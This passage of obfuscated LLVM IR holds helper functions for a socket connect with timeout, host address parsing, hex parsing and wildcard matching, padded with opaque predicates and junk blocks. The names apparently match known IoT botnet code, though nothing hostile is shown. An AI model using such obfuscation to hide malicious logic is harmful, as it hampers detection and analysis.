  %122 = call i64 @read(i32 %117, i8* %121, i64 1)
  %123 = trunc i64 %122 to i32
  store i32 %123, i32* %7, align 4
  %124 = load i32, i32* %8, align 4
  %_ = sub i32 %124, 1
  %gen = mul i32 %_, 1
  %_7 = sub i32 %124, 1
  %gen8 = mul i32 %_7, 1
  %_9 = sub i32 0, %124
  %gen10 = add i32 %_9, 1
  %_11 = sub i32 %124, 1
  %gen12 = mul i32 %_11, 1
  %_13 = sub i32 %124, 1
  %gen14 = mul i32 %_13, 1
  %_15 = sub i32 0, %124
  %gen16 = add i32 %_15, 1
  %_17 = sub i32 %124, 1
  %gen18 = mul i32 %_17, 1
  %125 = add nsw i32 %124, 1
  store i32 %125, i32* %8, align 4
  br label %originalBB6

originalBB22alteredBB:                            ; preds = %originalBB22, %91
  br label %originalBB22
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %212

; <label>:37:                                     ; preds = %4
  %38 = load i32, i32* @x.25
  %39 = load i32, i32* @y.26
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %37
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = load i32, i32* %6, align 4
  %49 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %50 = call i32 @connect(i32 %48, %struct.sockaddr* %49, i32 16)
  store i32 %50, i32* %16, align 4
  %51 = load i32, i32* %16, align 4
  %52 = icmp slt i32 %51, 0
  %53 = load i32, i32* @x.25
  %54 = load i32, i32* @y.26
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %52, label %61, label %187

; <label>:61:                                     ; preds = %originalBBpart2
  %62 = call i32* @__errno_location() #13
  %63 = load i32, i32* %62, align 4
  %64 = icmp eq i32 %63, 115
  br i1 %64, label %65, label %169

; <label>:65:                                     ; preds = %61
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %67, i64* %68, align 8
  %69 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %69, align 8
  br label %70

; <label>:70:                                     ; preds = %65
  %71 = load i32, i32* @x.25
  %72 = load i32, i32* @y.26
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %70
  %79 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %80 = getelementptr inbounds [16 x i64], [16 x i64]* %79, i64 0, i64 0
  %81 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %80) #2, !srcloc !1
  %82 = extractvalue { i64, i64* } %81, 0
  %83 = extractvalue { i64, i64* } %81, 1
  %84 = trunc i64 %82 to i32
  store i32 %84, i32* %17, align 4
  %85 = ptrtoint i64* %83 to i64
  %86 = trunc i64 %85 to i32
  store i32 %86, i32* %18, align 4
  %87 = load i32, i32* @x.25
  %88 = load i32, i32* @y.26
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %95

; <label>:95:                                     ; preds = %originalBBpart24
  %96 = load i32, i32* %6, align 4
  %97 = srem i32 %96, 64
  %98 = zext i32 %97 to i64
  %99 = shl i64 1, %98
  %100 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %101 = load i32, i32* %6, align 4
  %102 = sdiv i32 %101, 64
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds [16 x i64], [16 x i64]* %100, i64 0, i64 %103
  %105 = load i64, i64* %104, align 8
  %106 = or i64 %105, %99
  store i64 %106, i64* %104, align 8
  %107 = load i32, i32* %6, align 4
  %108 = add nsw i32 %107, 1
  %109 = call i32 @select(i32 %108, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %110 = icmp sgt i32 %109, 0
  br i1 %110, label %111, label %151

; <label>:111:                                    ; preds = %95
  store i32 4, i32* %13, align 4
  %112 = load i32, i32* %6, align 4
  %113 = bitcast i32* %14 to i8*
  %114 = call i32 @getsockopt(i32 %112, i32 1, i32 4, i8* %113, i32* %13) #2
  %115 = load i32, i32* %14, align 4
  %116 = icmp ne i32 %115, 0
  br i1 %116, label %117, label %134

; <label>:117:                                    ; preds = %111
  %118 = load i32, i32* @x.25
  %119 = load i32, i32* @y.26
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %117
  store i32 0, i32* %5, align 4
  %126 = load i32, i32* @x.25
  %127 = load i32, i32* @y.26
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %212

; <label>:134:                                    ; preds = %111
  %135 = load i32, i32* @x.25
  %136 = load i32, i32* @y.26
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %134
  %143 = load i32, i32* @x.25
  %144 = load i32, i32* @y.26
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %152

; <label>:151:                                    ; preds = %95
  store i32 0, i32* %5, align 4
  br label %212

; <label>:152:                                    ; preds = %originalBBpart212
  %153 = load i32, i32* @x.25
  %154 = load i32, i32* @y.26
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %152
  %161 = load i32, i32* @x.25
  %162 = load i32, i32* @y.26
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %186

; <label>:169:                                    ; preds = %61
  %170 = load i32, i32* @x.25
  %171 = load i32, i32* @y.26
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %169
  store i32 0, i32* %5, align 4
  %178 = load i32, i32* @x.25
  %179 = load i32, i32* @y.26
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %212

; <label>:186:                                    ; preds = %originalBBpart216
  br label %187

; <label>:187:                                    ; preds = %186, %originalBBpart2
  %188 = load i32, i32* @x.25
  %189 = load i32, i32* @y.26
  %190 = sub i32 %188, 1
  %191 = mul i32 %188, %190
  %192 = urem i32 %191, 2
  %193 = icmp eq i32 %192, 0
  %194 = icmp slt i32 %189, 10
  %195 = or i1 %193, %194
  br i1 %195, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %187
  %196 = load i32, i32* %6, align 4
  %197 = call i32 (i32, i32, ...) @fcntl(i32 %196, i32 3, i8* null)
  %198 = sext i32 %197 to i64
  store i64 %198, i64* %15, align 8
  %199 = load i64, i64* %15, align 8
  %200 = and i64 %199, -2049
  store i64 %200, i64* %15, align 8
  %201 = load i32, i32* %6, align 4
  %202 = load i64, i64* %15, align 8
  %203 = call i32 (i32, i32, ...) @fcntl(i32 %201, i32 4, i64 %202)
  store i32 1, i32* %5, align 4
  %204 = load i32, i32* @x.25
  %205 = load i32, i32* @y.26
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBBpart233, label %originalBB22alteredBB

originalBBpart233:                                ; preds = %originalBB22
  br label %212

; <label>:212:                                    ; preds = %originalBBpart233, %originalBBpart220, %151, %originalBBpart28, %36
  %213 = load i32, i32* %5, align 4
  ret i32 %213

originalBBalteredBB:                              ; preds = %originalBB, %37
  %214 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %215 = getelementptr inbounds [8 x i8], [8 x i8]* %214, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %215, i8 0, i64 8, i32 4, i1 false)
  %216 = load i32, i32* %6, align 4
  %217 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %218 = call i32 @connect(i32 %216, %struct.sockaddr* %217, i32 16)
  store i32 %218, i32* %16, align 4
  %219 = load i32, i32* %16, align 4
  %220 = icmp slt i32 %219, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %70
  %221 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %222 = getelementptr inbounds [16 x i64], [16 x i64]* %221, i64 0, i64 0
  %223 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %222) #2, !srcloc !1
  %224 = extractvalue { i64, i64* } %223, 0
  %225 = extractvalue { i64, i64* } %223, 1
  %226 = trunc i64 %224 to i32
  store i32 %226, i32* %17, align 4
  %227 = ptrtoint i64* %225 to i64
  %228 = trunc i64 %227 to i32
  store i32 %228, i32* %18, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %117
  store i32 0, i32* %5, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %134
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %152
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %169
  store i32 0, i32* %5, align 4
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %187
  %229 = load i32, i32* %6, align 4
  %230 = call i32 (i32, i32, ...) @fcntl(i32 %229, i32 3, i8* null)
  %231 = sext i32 %230 to i64
  store i64 %231, i64* %15, align 8
  %232 = load i64, i64* %15, align 8
  %_ = sub i64 0, %232
  %gen = add i64 %_, -2049
  %_23 = sub i64 0, %232
  %gen24 = add i64 %_23, -2049
  %_25 = shl i64 %232, -2049
  %_26 = shl i64 %232, -2049
  %_27 = sub i64 %232, -2049
  %gen28 = mul i64 %_27, -2049
  %_29 = shl i64 %232, -2049
  %_30 = sub i64 %232, -2049
  %gen31 = mul i64 %_30, -2049
  %233 = and i64 %232, -2049
  store i64 %233, i64* %15, align 8
  %234 = load i32, i32* %6, align 4
  %235 = load i64, i64* %15, align 8
  %236 = call i32 (i32, i32, ...) @fcntl(i32 %234, i32 4, i64 %235)
  store i32 1, i32* %5, align 4
  br label %originalBB22
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %29

; <label>:12:                                     ; preds = %2
  %13 = load i32, i32* @x.27
  %14 = load i32, i32* @y.28
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %12
  store i32 1, i32* %3, align 4
  %21 = load i32, i32* @x.27
  %22 = load i32, i32* @y.28
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %30

; <label>:29:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %30

; <label>:30:                                     ; preds = %29, %originalBBpart2
  %31 = load i32, i32* %3, align 4
  ret i32 %31

originalBBalteredBB:                              ; preds = %originalBB, %12
  store i32 1, i32* %3, align 4
  br label %originalBB
}

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = load i32, i32* @x.29
  %3 = load i32, i32* @y.30
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  store i8* %0, i8** %10, align 8
  store i64 0, i64* %11, align 8
  %12 = load i32, i32* @x.29
  %13 = load i32, i32* @y.30
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %20

; <label>:20:                                     ; preds = %62, %originalBBpart2
  %21 = load i32, i32* @x.29
  %22 = load i32, i32* @y.30
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %20
  %29 = load i8*, i8** %10, align 8
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp ne i32 %31, 0
  %33 = load i32, i32* @x.29
  %34 = load i32, i32* @y.30
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %32, label %41, label %60

; <label>:41:                                     ; preds = %originalBBpart24
  %42 = load i32, i32* @x.29
  %43 = load i32, i32* @y.30
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %41
  %50 = load i64, i64* %11, align 8
  %51 = icmp sge i64 %50, 0
  %52 = load i32, i32* @x.29
  %53 = load i32, i32* @y.30
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %60

; <label>:60:                                     ; preds = %originalBBpart28, %originalBBpart24
  %61 = phi i1 [ false, %originalBBpart24 ], [ %51, %originalBBpart28 ]
  br i1 %61, label %62, label %72

; <label>:62:                                     ; preds = %60
  %63 = load i64, i64* %11, align 8
  %64 = shl i64 %63, 4
  %65 = load i8*, i8** %10, align 8
  %66 = getelementptr inbounds i8, i8* %65, i32 1
  store i8* %66, i8** %10, align 8
  %67 = load i8, i8* %65, align 1
  %68 = zext i8 %67 to i64
  %69 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %68
  %70 = load i64, i64* %69, align 8
  %71 = or i64 %64, %70
  store i64 %71, i64* %11, align 8
  br label %20

; <label>:72:                                     ; preds = %60
  %73 = load i32, i32* @x.29
  %74 = load i32, i32* @y.30
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %72
  %81 = load i64, i64* %11, align 8
  %82 = load i32, i32* @x.29
  %83 = load i32, i32* @y.30
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  ret i64 %81

originalBBalteredBB:                              ; preds = %originalBB, %1
  %90 = alloca i8*, align 8
  %91 = alloca i64, align 8
  store i8* %0, i8** %90, align 8
  store i64 0, i64* %91, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %20
  %92 = load i8*, i8** %10, align 8
  %93 = load i8, i8* %92, align 1
  %94 = zext i8 %93 to i32
  %95 = icmp ne i32 %94, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %41
  %96 = load i64, i64* %11, align 8
  %97 = icmp sge i64 %96, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %72
  %98 = load i64, i64* %11, align 8
  br label %originalBB10
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %118 [
    i32 0, label %9
    i32 42, label %29
    i32 63, label %85
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i32, i32* @x.31
  %11 = load i32, i32* @y.32
  %12 = sub i32 %10, 1
  %13 = mul i32 %10, %12
  %14 = urem i32 %13, 2
  %15 = icmp eq i32 %14, 0
  %16 = icmp slt i32 %11, 10
  %17 = or i1 %15, %16
  br i1 %17, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %9
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  store i32 %20, i32* %3, align 4
  %21 = load i32, i32* @x.31
  %22 = load i32, i32* @y.32
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %140

; <label>:29:                                     ; preds = %2
  %30 = load i8*, i8** %4, align 8
  %31 = getelementptr inbounds i8, i8* %30, i64 1
  %32 = load i8*, i8** %5, align 8
  %33 = call i32 @wildString(i8* %31, i8* %32)
  %34 = icmp ne i32 %33, 0
  br i1 %34, label %35, label %65

; <label>:35:                                     ; preds = %29
  %36 = load i8*, i8** %5, align 8
  %37 = load i8, i8* %36, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %47

; <label>:40:                                     ; preds = %35
  %41 = load i8*, i8** %4, align 8
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i64 1
  %44 = call i32 @wildString(i8* %41, i8* %43)
  %45 = icmp ne i32 %44, 0
  %46 = xor i1 %45, true
  br label %47

; <label>:47:                                     ; preds = %40, %35
  %48 = phi i1 [ false, %35 ], [ %46, %40 ]
  %49 = load i32, i32* @x.31
  %50 = load i32, i32* @y.32
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %47
  %57 = load i32, i32* @x.31
  %58 = load i32, i32* @y.32
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %65

; <label>:65:                                     ; preds = %originalBBpart24, %29
  %66 = phi i1 [ true, %29 ], [ %48, %originalBBpart24 ]
  %67 = load i32, i32* @x.31
  %68 = load i32, i32* @y.32
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %65
  %75 = xor i1 %66, true
  %76 = zext i1 %75 to i32
  store i32 %76, i32* %3, align 4
  %77 = load i32, i32* @x.31
  %78 = load i32, i32* @y.32
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart218, label %originalBB6alteredBB

originalBBpart218:                                ; preds = %originalBB6
  br label %140

; <label>:85:                                     ; preds = %2
  %86 = load i8*, i8** %5, align 8
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %90, label %114

; <label>:90:                                     ; preds = %85
  %91 = load i32, i32* @x.31
  %92 = load i32, i32* @y.32
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %90
  %99 = load i8*, i8** %4, align 8
  %100 = getelementptr inbounds i8, i8* %99, i64 1
  %101 = load i8*, i8** %5, align 8
  %102 = getelementptr inbounds i8, i8* %101, i64 1
  %103 = call i32 @wildString(i8* %100, i8* %102)
  %104 = icmp ne i32 %103, 0
  %105 = xor i1 %104, true
  %106 = load i32, i32* @x.31
  %107 = load i32, i32* @y.32
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart231, label %originalBB20alteredBB

originalBBpart231:                                ; preds = %originalBB20
  br label %114

; <label>:114:                                    ; preds = %originalBBpart231, %85
  %115 = phi i1 [ false, %85 ], [ %105, %originalBBpart231 ]
  %116 = xor i1 %115, true
  %117 = zext i1 %116 to i32
  store i32 %117, i32* %3, align 4
  br label %140

; <label>:118:                                    ; preds = %2
  %119 = load i8*, i8** %4, align 8
  %120 = load i8, i8* %119, align 1
  %121 = zext i8 %120 to i32
  %122 = call i32 @toupper(i32 %121) #10
  %123 = load i8*, i8** %5, align 8
  %124 = load i8, i8* %123, align 1
  %125 = zext i8 %124 to i32
  %126 = call i32 @toupper(i32 %125) #10
  %127 = icmp eq i32 %122, %126
  br i1 %127, label %128, label %136

; <label>:128:                                    ; preds = %118
  %129 = load i8*, i8** %4, align 8
  %130 = getelementptr inbounds i8, i8* %129, i64 1
  %131 = load i8*, i8** %5, align 8
  %132 = getelementptr inbounds i8, i8* %131, i64 1
  %133 = call i32 @wildString(i8* %130, i8* %132)
  %134 = icmp ne i32 %133, 0
  %135 = xor i1 %134, true
  br label %136

; <label>:136:                                    ; preds = %128, %118
  %137 = phi i1 [ false, %118 ], [ %135, %128 ]
  %138 = xor i1 %137, true
  %139 = zext i1 %138 to i32
  store i32 %139, i32* %3, align 4
  br label %140

; <label>:140:                                    ; preds = %136, %114, %originalBBpart218, %originalBBpart2
  %141 = load i32, i32* %3, align 4
  ret i32 %141

originalBBalteredBB:                              ; preds = %originalBB, %9
  %142 = load i8*, i8** %5, align 8
  %143 = load i8, i8* %142, align 1
  %144 = zext i8 %143 to i32
  store i32 %144, i32* %3, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %47
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %65
  %_ = shl i1 %66, true
  %_7 = sub i1 false, %66
  %gen = add i1 %_7, true
  %_8 = sub i1 false, %66
  %gen9 = add i1 %_8, true
  %_10 = sub i1 false, %66
  %gen11 = add i1 %_10, true
  %_12 = sub i1 %66, true
  %gen13 = mul i1 %_12, true
